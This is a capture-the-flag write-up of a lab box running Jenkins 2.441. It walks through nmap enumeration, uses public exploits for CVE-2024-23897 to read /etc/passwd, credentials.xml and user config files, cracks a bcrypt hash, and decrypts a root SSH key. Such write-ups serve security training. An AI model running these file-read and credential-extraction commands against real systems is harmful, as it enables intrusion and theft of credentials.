#Pwned! 
```IP
10.10.11.10
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 10.10.11.10 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223102435.png?raw=true)

## HTTP 8080
ffuf with seclist big.txt:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223102727.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223103159.png?raw=true)
We also get a user called jennifer and anonymous. If we see the web source code we will find the jenkins version,Jenkins 2.441, which apparently is vulnerable to **CVE-2024-23897**.
This exploit seems to meet the requirements:
https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability
```
python exploit.py -u http://10.10.11.10:8080/ -f /etc/passwd
```
And this too:
https://www.exploit-db.com/exploits/51993
```
python exploit2.py -u http://10.10.11.10:8080 -p /etc/passwd
```
Both ways we get to read /etc/passwd and get user `jenkins`.
So here it talks about some files to read with this LFI
https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability
And reading credentials.xml we get an ssh privatekey for root
```
python exploit2.py -u http://10.10.11.10:8080 -p /var/jenkins_home/credentials.xml
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223110927.png?raw=true)
According to the blog, we can decrypt this on the script directory of jenkins, but we don't have access to it. We can download the .jar in the bin directory however, and try to execute the groovy script in our local machine:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223115658.png?raw=true)
but we are executing it as anonymous and we don't have permissions to execute this apparently.
Another interesting file would be users.xml:
```
python exploit2.py -u http://10.10.11.10:8080 -p /var/jenkins_home/users/users.xml
```
Where we get a user `jennifer_12108429903186576833` which we can use to get config.xml:
```
python exploit2.py -u http://10.10.11.10:8080 -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```
Which contains a bcrypt hash
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223120458.png?raw=true)
```
john --wordlist=/usr/share/wordlists/rockyou.txt files/bcrypt.hash 
```
Cracking it we get the password:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223120754.png?raw=true)
So now we have access to jenkins console and we can run commands
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223121023.png?raw=true)
And also we can go to scripts and execute the script that the blog post talked about in order to decrypt the private key:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223121312.png?raw=true)
And saving it to a file, giving it 600 permissions we can login and we are root!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223121506.png?raw=true)
We get the flags:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241223121543.png?raw=true)
# Exploitation

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

